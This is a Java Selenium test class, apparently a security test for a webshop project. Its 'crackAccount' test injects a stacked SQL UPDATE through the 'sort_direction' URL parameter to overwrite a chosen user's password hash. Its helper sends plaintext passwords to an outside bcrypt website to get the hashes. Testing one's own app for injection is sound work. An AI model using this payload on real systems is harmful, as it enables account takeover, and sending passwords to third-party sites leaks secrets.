package com.codecanvas.webshoptests;

import com.codecanvas.webshop.POM.HomePom;
import com.codecanvas.webshop.POM.LoginPom;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvFileSource;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import waiter.Waiter;

public class sqlInjection {

    private LoginPom lp;
    private String sqlString;
    private WebDriver driver;

    @BeforeEach
    public void init() {

        lp = new LoginPom();
        lp.getDriver().manage().window().fullscreen();
        sqlString = lp.BASE_URL + "/list?sort_by=submission_time&sort_direction=ASC;update%%20users%%20set%%20password_hash=%%27%s%%27%%20where%%20username=%%27%s%%27;";

    }

    @ParameterizedTest
    @CsvFileSource(resources = "/sqlInjectionUrl.csv")
    public void crackAccount(String username, String password) {

        String hash = getHash(password);
        lp.getDriver().get(String.format(sqlString, hash, username));
        lp.goToPage();
    }


    private String getHash(String password) {
        driver = new ChromeDriver();
        WebDriverWait wait = new WebDriverWait(driver, 10);

        driver.get("https://bcrypt-generator.com/");
        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("[placeholder='String to encrypt']")));
        driver.findElement(By.cssSelector("[placeholder='String to encrypt']")).sendKeys(password + Keys.RETURN);
        wait.until(ExpectedConditions.presenceOfElementLocated(By.xpath("//div[@class='col-md alert alert-success']")));
        String hash = driver.findElement(By.xpath("//div[@class='col-md alert alert-success']")).getText();
        driver.quit();
        return hash;
    }
}
